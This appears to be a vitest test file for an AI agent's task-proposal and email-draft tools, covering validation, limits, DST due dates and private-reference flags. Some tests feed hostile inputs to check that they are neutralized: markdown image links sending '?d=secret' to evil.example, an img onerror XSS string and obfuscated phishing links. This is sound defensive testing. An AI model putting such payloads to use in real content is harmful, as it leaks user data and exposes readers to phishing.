import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

vi.mock("next/cache", () => ({ unstable_cache: <T>(fn: T) => fn }));
vi.mock("@/lib/supabase-admin", () => ({ getSupabaseAdmin: vi.fn() }));
vi.mock("@/lib/supabase-server", () => ({ getSupabaseServer: vi.fn() }));
vi.mock("@/lib/exec/ops", () => ({ notifyOps: vi.fn() }));
vi.mock("@/lib/exec/sources/dd", async (orig) => (await import("./__tests__/b-stub")).stubModule(await orig()));
vi.mock("@/lib/exec/sources/dd-text", async (orig) => (await import("./__tests__/b-stub")).stubModule(await orig(), ["submittedTextIsCurrent"]));
vi.mock("@/lib/exec/sources/mail", async (orig) =>
  (await import("./__tests__/b-stub")).stubOnly(await orig(), ["loadScreeningPolicy", "readPrincipalThread", "loadHisBodies", "listAllReplyArtifacts", "searchPrincipalThreads"])
);
vi.mock("@/lib/exec/email-store", async (orig) =>
  (await import("./__tests__/b-stub")).stubOnly(await orig(), ["getEmailThread", "listBucketRows", "listCommitments", "listSignalsForMessages", "listThreadScreenRows"])
);
vi.mock("@/lib/exec/sync-state", async (orig) => (await import("./__tests__/b-stub")).stubOnly(await orig(), ["getSyncState"]));
vi.mock("@/lib/exec/attention-read", () => ({ listScreenedAttention: vi.fn(), getScreenedAttentionItem: vi.fn() }));
vi.mock("@/lib/exec/team", () => ({ getTeamView: vi.fn(), getWorkingNow: vi.fn() }));
vi.mock("@/lib/exec/projects-view", () => ({ getProjectsListView: vi.fn(), getProjectDetail: vi.fn() }));
vi.mock("@/lib/exec/intake-screen", () => ({
  loadIntakeScreeningPolicy: vi.fn(), restrictedIntakeTaskIds: vi.fn(), intakeThreadIdsForTasks: vi.fn(), listScreenedApprovalItems: vi.fn()
}));
vi.mock("@/lib/exec/overview", () => ({ getOverview: vi.fn() }));
vi.mock("@/lib/exec/audit", () => ({ auditEvent: vi.fn() }));
vi.mock("@/lib/exec/chat-store", () => ({ insertProposal: vi.fn() }));
vi.mock("@/lib/exec/drafts", () => ({ createChatReplyDraft: vi.fn() }));
// Area C's real neutralizeTaskText (chat/answer.ts) runs unmocked.

import { MarkdownBody } from "@/components/MarkdownBody";
import { privateRefKinds, setPrivateRefsSupportedForTests } from "@/lib/exec/agent/tools";
import { ConsultedBudget } from "@/lib/exec/agent/serialize";
import { insertProposal, type NewProposal } from "@/lib/exec/chat-store";
import { createChatReplyDraft } from "@/lib/exec/drafts";
import { draftPageHref } from "@/lib/exec/drafts-links";
import { getEmailThread } from "@/lib/exec/email-store";
import { listTasksByIds } from "@/lib/exec/sources/dd";
import { getTaskDescriptions } from "@/lib/exec/sources/dd-text";
import { getSupabaseAdmin } from "@/lib/supabase-admin";
import { installDefaults, makeCtx, runTool, storedThread, task } from "./__tests__/b-tools-harness";

// P5b contract §3.11.3 tools 14-15: the staged writes (tests 32, 33, 117, 118).

beforeEach(() => {
  installDefaults();
});
afterEach(() => {
  setPrivateRefsSupportedForTests(true);
});

const proposal = (over: Record<string, unknown> = {}) => ({
  title: "Call Acme about the report",
  description: "They asked twice.",
  assignee: "",
  due_date: "",
  client: "",
  priority: "medium",
  ...over
});
const inserted = (i = 0): NewProposal => vi.mocked(insertProposal).mock.calls[i][1];

describe("propose_task (tests 32, 117, 118)", () => {
  it("validation: title, date shape, a date before his today", async () => {
    const ctx = makeCtx();
    expect((await runTool(ctx, "propose_task", proposal({ title: "   " }))).text).toBe("Invalid input: title must be 1-200 characters.");
    expect((await runTool(ctx, "propose_task", proposal({ title: "x".repeat(201) }))).record.error).toBe("bad_input");
    expect((await runTool(ctx, "propose_task", proposal({ due_date: "2026-13-01" }))).text).toBe("Invalid input: due_date must be '' or a real date as YYYY-MM-DD.");
    expect((await runTool(ctx, "propose_task", proposal({ due_date: "next friday" }))).record.error).toBe("bad_input");
    expect((await runTool(ctx, "propose_task", proposal({ due_date: "2026-11-03" }))).text).toBe("Invalid input: due_date is before today in his timezone.");
    expect(vi.mocked(insertProposal)).not.toHaveBeenCalled();
  });

  it("strict resolution: a prefix assignee or client → needs_choice with that one candidate; an exact first name is taken", async () => {
    const p = await runTool(makeCtx(), "propose_task", proposal({ assignee: "Bob S" }));
    expect(p.json.needs_choice).toMatchObject({ param: "assignee", matches: [{ id: "u_bob", name: "Bob Stone" }] });
    const c = await runTool(makeCtx(), "propose_task", proposal({ client: "Zen" }));
    expect(c.json.needs_choice).toMatchObject({ param: "client", matches: [{ id: "c_zen", name: "Zenith Law" }] });
    expect(vi.mocked(insertProposal)).not.toHaveBeenCalled();
    const first = await runTool(makeCtx(), "propose_task", proposal({ assignee: "bob", client: "zenith law" }));
    expect(first.isError).toBe(false);
    expect(inserted()).toMatchObject({ assigneeUserId: "u_bob", assigneeName: "Bob Stone", departmentId: "d_web", clientName: "Zenith Law" });
    await runTool(makeCtx(), "propose_task", proposal({ assignee: "me" }));
    expect(inserted(1)).toMatchObject({ assigneeUserId: "u_mitchell", departmentId: null });
    await runTool(makeCtx(), "propose_task", proposal({ assignee: "unassigned" }));
    expect(inserted(2)).toMatchObject({ assigneeUserId: null, assigneeName: null });
  });

  it("due 17:00 local → ISO across DST; the row has the message id, a 7-day expiry and the identical key set; the card; no tasks write", async () => {
    const now = new Date("2026-10-28T15:00:00.000Z");
    const ctx = makeCtx({ now });
    const a = await runTool(ctx, "propose_task", proposal({ due_date: "2026-10-30" }));
    const b = await runTool(ctx, "propose_task", proposal({ due_date: "2026-11-02", assignee: "Ann Lee", client: "Acme Dental", priority: "high" }));
    expect(inserted(0)).toMatchObject({ dueOn: "2026-10-30", dueAt: "2026-10-30T21:00:00.000Z", conversationId: "cv_1", messageId: "msg_a1", expiresAt: "2026-11-04T15:00:00.000Z" });
    expect(inserted(1)).toMatchObject({ dueOn: "2026-11-02", dueAt: "2026-11-02T22:00:00.000Z", priority: "high" });
    expect(Object.keys(inserted(0)).sort()).toEqual(Object.keys(inserted(1)).sort());
    expect(ctx.cards).toEqual([
      { kind: "task_proposal", id: (a.json.proposal as { id: string }).id },
      { kind: "task_proposal", id: (b.json.proposal as { id: string }).id }
    ]);
    expect(a.json.note).toBe("Nothing is created until he confirms the card. The card shows the full text he will confirm.");
    expect(a.json.proposal).toMatchObject({ status: "pending", description_chars: 17 });
    expect(vi.mocked(getSupabaseAdmin)).not.toHaveBeenCalled();
  });

  it("the 6th call in a turn → limit, and a failed call still counts", async () => {
    const ctx = makeCtx();
    await runTool(ctx, "propose_task", proposal({ title: "" }));
    for (let i = 0; i < 4; i += 1) expect((await runTool(ctx, "propose_task", proposal())).isError).toBe(false);
    const sixth = await runTool(ctx, "propose_task", proposal());
    expect(sixth.record.error).toBe("limit");
    expect(sixth.text).toBe("Only 5 tasks can be staged per question. Tell him which ones are left and offer to stage them next.");
    expect(ctx.cards).toHaveLength(4);
  });

  it("test 118: the hostile payload is stored link-neutralized, tag-free, one-line and masked", async () => {
    await runTool(
      makeCtx(),
      "propose_task",
      proposal({
        title: "Fix ![x](https://evil.example/p.png?d=secret) [click](https://evil.example)\nsecond line",
        description: [
          "See ![x](https://evil.example/p.png?d=secret) and [click](https://evil.example).",
          "<img src=x onerror=alert(1)>",
          "Bare https://evil.example/leak here.",
          "[1]: https://evil.example/ref",
          "password: hunter2"
        ].join("\n")
      })
    );
    const row = inserted();
    for (const s of [row.title, row.description]) {
      expect(s).not.toContain("![");
      expect(s).not.toContain("](");
      expect(s.toLowerCase()).not.toContain("<img");
      expect(s).not.toMatch(/<[a-z/][^>]*>/i);
      expect(s).not.toMatch(/(^|[^`])https?:\/\//);
    }
    expect(row.title).not.toMatch(/[\r\n]/);
    expect(row.description).toContain("password: [hidden]");
    expect(row.description).not.toContain("hunter2");
  });

  it("security-1: the review's seven payloads are stored as descriptions MarkdownBody renders with no link or image", async () => {
    const BS = String.fromCharCode(92);
    const payloads = [
      "See [the report][x] now.\n\n[x]:\n//evil.example/phish",
      "See [the report][x] now.\n\n> [x]: https:evil.example/phish",
      "Look ![logo][p]\n\n[p]:\nhttps:evil.example/pixel.png",
      `See [report][a${BS}]b]\n\n[a${BS}]b]: //evil.example/x`,
      "See [a [b [c]] d](//evil.example/x)",
      "See [doc](//evil.example/((a)))",
      "Reply to bob@evil.example"
    ];
    for (const [i, description] of payloads.entries()) {
      await runTool(makeCtx(), "propose_task", proposal({ description }));
      const html = renderToStaticMarkup(createElement(MarkdownBody, { content: inserted(i).description }));
      expect(html, description).not.toMatch(/<a[\s>]|<img[\s>]/);
    }
  });

  it("loop-1: a long description and title are clipped without half a surrogate pair, in the row and in the record", async () => {
    const face = String.fromCodePoint(0x1f600);
    const lone = (s: string) => /[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/.test(s);
    // The record keeps 500 characters: the pair straddles 499/500. The stored description: 3 escapes push a pair's
    // first half to index 3,999 of the 4,000 the row allows.
    const run = await runTool(makeCtx(), "propose_task", proposal({ description: `a<<<${face.repeat(1997)}zz`, title: `${"t".repeat(199)}${face}`.slice(0, 200) }));
    expect(run.isError).toBe(false);
    const recorded = run.record.args as Record<string, string>;
    expect(lone(recorded.description)).toBe(false);
    expect(recorded.description.length).toBeLessThanOrEqual(500);
    expect(lone(inserted().description)).toBe(false);
    expect(inserted().description.length).toBeLessThanOrEqual(4000);
    expect(lone(inserted().title)).toBe(false);
    const straddle = await runTool(makeCtx(), "propose_task", proposal({ description: `${"x".repeat(499)}${face}${"y".repeat(10)}` }));
    expect((straddle.record.args as Record<string, string>).description).toBe("x".repeat(499));
  });
});

describe("create_draft (test 33)", () => {
  const input = { thread_id: "th_draft", instruction: "Say we'll send the report Friday." };

  beforeEach(() => {
    vi.mocked(getEmailThread).mockResolvedValue(storedThread({ threadId: "th_draft", clientId: "c_acme", clientName: "Acme Dental" }));
  });

  it("privateRefKinds per C24", () => {
    const ctx = makeCtx();
    ctx.consulted.admit(["th_draft"]);
    expect(privateRefKinds(ctx, false, "th_draft", "c_acme")).toEqual([]);
    ctx.consulted.admit(["th_other"]);
    expect(privateRefKinds(ctx, false, "th_draft", "c_acme")).toEqual(["other_threads"]);
    const replayed = makeCtx({ priorSets: { threads: new Set(["th_old"]), clients: new Set(), ddText: true } });
    expect(privateRefKinds(replayed, false, "th_draft", "c_acme")).toEqual(["other_threads", "dd_text"]);
    const clients = makeCtx();
    clients.consultedClients.add("c_acme");
    expect(privateRefKinds(clients, false, "th_draft", "c_acme")).toEqual([]);
    expect(privateRefKinds(clients, false, "th_draft", null)).toEqual(["other_clients"]);
    clients.consultedClients.add("c_zen");
    expect(privateRefKinds(clients, true, "th_draft", "c_acme")).toEqual(["dd_text", "other_clients"]);
  });

  it("a draft of the only thread read is not private; the card, the link and the notes", async () => {
    const ctx = makeCtx();
    const r = await runTool(ctx, "create_draft", input);
    // security-2: the answer this turn writes is passed, so the draft is linked to it.
    expect(vi.mocked(createChatReplyDraft)).toHaveBeenCalledWith(expect.anything(), { threadId: "th_draft", instruction: input.instruction, usesPrivateRefs: false, chatMessageId: ctx.assistantMessageId }, expect.objectContaining({ signal: expect.any(AbortSignal) }));
    const id = "ed_00000000000000000000000000000001";
    expect(r.json.draft).toEqual({ id, status: "generating", link: draftPageHref(id), existing: false, private_refs: [] });
    expect(r.json.note).toBe("Nothing is sent. He reviews and sends it from DD.");
    expect(ctx.cards).toEqual([{ kind: "draft", id, existing: false, privateRefKinds: [] }]);
    expect(ctx.consulted.values()).toEqual(["th_draft"]);
  });

  it("other threads read this turn, DD text delivered this turn, and other clients make it private (with the note)", async () => {
    vi.mocked(listTasksByIds).mockResolvedValue([task({ id: "t_1" })]);
    vi.mocked(getTaskDescriptions).mockResolvedValue(new Map([["t_1", "Some DD text"]]));
    const ctx = makeCtx();
    ctx.consulted.admit(["th_other"]);
    ctx.consultedClients.add("c_zen");
    await runTool(ctx, "get_task", { task_id: "t_1" });
    const r = await runTool(ctx, "create_draft", input);
    expect(vi.mocked(createChatReplyDraft).mock.calls[0][1].usesPrivateRefs).toBe(true);
    expect((r.json.draft as { private_refs: string[] }).private_refs).toEqual(["other_threads", "dd_text", "other_clients"]);
    expect(r.json.note).toContain("He will be asked to confirm the draft doesn't share anything from other mail, notes or clients before saving or sending.");
    expect(ctx.cards[0]).toMatchObject({ kind: "draft", privateRefKinds: ["other_threads", "dd_text", "other_clients"] });
  });

  it("ui-2: an existing draft with private material read → card kinds [], no confirm note, private_refs [] to the model", async () => {
    const id = "ed_00000000000000000000000000000009";
    vi.mocked(createChatReplyDraft).mockResolvedValue({ kind: "existing", draftId: id, status: "draft" });
    const ctx = makeCtx();
    ctx.consulted.admit(["th_other"]);
    const r = await runTool(ctx, "create_draft", input);
    expect(vi.mocked(createChatReplyDraft).mock.calls[0][1].usesPrivateRefs).toBe(true);
    expect(ctx.cards).toEqual([{ kind: "draft", id, existing: true, privateRefKinds: [] }]);
    expect(r.json.draft).toMatchObject({ id, existing: true, private_refs: [] });
    expect(r.json.note).toBe("Nothing is sent. He reviews and sends it from DD. A draft already exists for this thread; your instruction was not applied to it.");
    expect(String(r.json.note)).not.toContain("He will be asked to confirm");
  });

  it("an existing draft adds its note; refusals are values with their notes", async () => {
    vi.mocked(createChatReplyDraft).mockResolvedValueOnce({ kind: "existing", draftId: "ed_00000000000000000000000000000002", status: "draft" });
    const existing = await runTool(makeCtx(), "create_draft", input);
    expect(existing.json.note).toBe("Nothing is sent. He reviews and sends it from DD. A draft already exists for this thread; your instruction was not applied to it.");
    const cases = [
      ["drafts_off", "Drafting is turned off in Settings."],
      ["email_off", "Drafting is turned off in Settings."],
      ["no_pin", "His mailbox isn't connected for drafting right now."],
      ["mailbox_problem", "His mailbox isn't connected for drafting right now."],
      ["rate_limited", "Too many drafts were started in the last 10 minutes; try again later."],
      ["drafts_unavailable", "Drafting isn't available right now."],
      ["unavailable", "Drafting isn't available right now."],
      ["unavailable_thread", "That thread isn't available."],
      ["needs_check", "An earlier draft for this email may already have been sent. He should check his Sent Items and start the reply from the thread page."]
    ] as const;
    for (const [reason, note] of cases) {
      vi.mocked(createChatReplyDraft).mockResolvedValueOnce({ kind: "refused", reason });
      const ctx = makeCtx();
      const r = await runTool(ctx, "create_draft", input);
      expect(r.isError).toBe(false);
      expect(r.json).toMatchObject({ draft: null, refused: reason, note });
      expect(ctx.cards).toEqual([]);
    }
  });

  it("an instruction over 2,000 → bad_input; the 4th call → limit; the private-refs fallback refuses without a call", async () => {
    const long = await runTool(makeCtx(), "create_draft", { ...input, instruction: "x".repeat(2001) });
    expect(long.record.error).toBe("bad_input");
    const ctx = makeCtx();
    for (let i = 0; i < 3; i += 1) await runTool(ctx, "create_draft", input);
    const fourth = await runTool(ctx, "create_draft", input);
    expect(fourth.text).toBe("Only 3 drafts can be started per question. Tell him which ones are left.");
    vi.mocked(createChatReplyDraft).mockClear();
    setPrivateRefsSupportedForTests(false);
    const priv = makeCtx({ consulted: new ConsultedBudget(500) });
    priv.consulted.admit(["th_other"]);
    const refused = await runTool(priv, "create_draft", input);
    expect(refused.json).toMatchObject({ draft: null, refused: "unavailable", note: "Drafting isn't available right now." });
    expect(vi.mocked(createChatReplyDraft)).not.toHaveBeenCalled();
    const clean = await runTool(makeCtx(), "create_draft", input);
    expect(clean.json.draft).toMatchObject({ existing: false });
  });
});
